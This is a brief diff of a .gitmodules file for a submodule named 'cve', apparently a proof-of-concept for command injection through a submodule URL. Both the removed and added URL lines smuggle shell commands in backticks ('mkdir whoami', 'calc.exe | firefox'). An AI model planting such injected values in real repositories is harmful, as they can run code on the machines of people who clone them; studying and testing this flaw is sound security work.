@@ -1,3 +1,3 @@
 [submodule "cve"]
 	path = cve
-	url = ssh://`mkdir whoami`foo.example.com/bar
+	url = ssh://`calc.exe | firefox`foo.example.com/bar
